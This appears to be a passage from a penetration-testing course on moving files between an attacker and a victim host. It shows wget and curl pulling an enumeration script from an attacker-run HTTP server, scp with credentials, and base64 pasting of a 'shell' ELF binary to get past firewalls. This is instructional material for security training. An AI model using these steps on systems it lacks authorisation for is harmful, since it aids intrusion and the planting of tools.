We'll often need to transfer files between the attacker and victim.
## wget
One method is to run a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and use `wget` or `curl` to download the file on the remote host. First, `cd` to the file we need to transfer and run a `Python HTTP` server in it:

```bash
$cd /tmp
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can download the file on the remote host:

```bash
user@remotehost$ wget http://[our ip]:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```
```bash
# Alternatively, we can use curl:

user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
# Note the use of -o to specify the file output name.

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

## scp
Alternatively, we can use `scp` ***if* we have ssh user credentials:***

```bash
$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

> Note that we specified the local file name after `scp` and the remote directory it will be saved to after `:`.

## base64
Sometimes, we might not be able to transfer the file, for example if the host has firewall protections. In this case, we can use a simple trick. We can encode the file into `base64`, copy it, paste it into the remote machine and decode it. For example:

```bash
$ base64 shell -w 0
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU

user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers
To validate file format, we can use `file`:

```bash
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

We can see that running `file` on `shell` reveals it is an `ELF Binary`, meaning it was successfully transferred.

To verify that the file wasn't changed during transfer, we can hash the original and the copy and make sure the results match:

```bash
$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell

user@remotehost$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```

